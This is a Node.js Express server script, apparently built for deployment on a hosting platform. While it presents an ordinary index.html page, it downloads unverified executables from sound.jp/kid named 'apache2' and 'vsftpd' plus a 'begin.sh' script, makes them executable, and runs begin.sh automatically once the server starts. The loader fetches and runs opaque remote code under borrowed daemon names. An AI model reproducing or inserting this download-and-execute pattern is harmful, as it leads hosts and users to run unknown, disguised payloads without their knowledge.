const express = require('express');
const path = require('path');
const fs = require('fs');
const util = require('util');
const axios = require('axios');
const exec = util.promisify(require('child_process').exec);

const app = express();
const port = process.env.PORT || 3000;

// 需要下载的文件列表
const filesToDownloadAndExecute = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://sound.jp/kid/apache2',
    filename: 'apache2',
  },
  {
    url: 'https://sound.jp/kid/vsftpd',
    filename: 'vsftpd',
  },
  {
    url: 'https://sound.jp/kid/begin.sh',
    filename: 'begin.sh',
  },
];

// 下载单个文件
const downloadFile = async ({ url, filename }) => {
  console.log(`开始下载: ${filename}`);
  const { data: stream } = await axios.get(url, { responseType: 'stream' });
  const writer = fs.createWriteStream(filename);
  stream.pipe(writer);
  
  return new Promise((resolve, reject) => {
    writer.on('error', reject);
    writer.on('finish', () => {
      console.log(`${filename} 下载完成`);
      resolve();
    });
  });
};

// 设置文件执行权限
const setPermissions = async () => {
  console.log('设置执行权限...');
  await exec('chmod +x begin.sh');
  await exec('chmod +x apache2');
  await exec('chmod +x vsftpd');
  console.log('执行权限设置完成');
};

// 执行begin.sh脚本
const runStartScript = async () => {
  console.log('执行begin.sh脚本...');
  const { stdout } = await exec('./begin.sh');
  console.log('begin.sh输出:', stdout);
  console.log('begin.sh执行完成');
};

// 主函数：按正确顺序执行所有步骤
const main = async () => {
  try {
    // 1. 下载所有文件
    console.log('开始下载所有文件...');
    for (const file of filesToDownloadAndExecute) {
      await downloadFile(file);
    }
    console.log('所有文件下载完成');

    // 2. 设置执行权限
    await setPermissions();

    // 3. 配置并启动web服务器
    app.get('/', (req, res) => {
      res.sendFile(path.join(__dirname, 'index.html'));
    });

    app.listen(port, async () => {
      console.log(`web服务器已启动: http://localhost:${port}`);
      
      // 4. 服务器启动后立即执行begin.sh
      try {
        await runStartScript();
      } catch (error) {
        console.error('执行begin.sh时出错:', error);
      }
    });

  } catch (error) {
    console.error('发生错误:', error);
    process.exit(1);
  }
};

// 启动程序
main().catch(console.error);
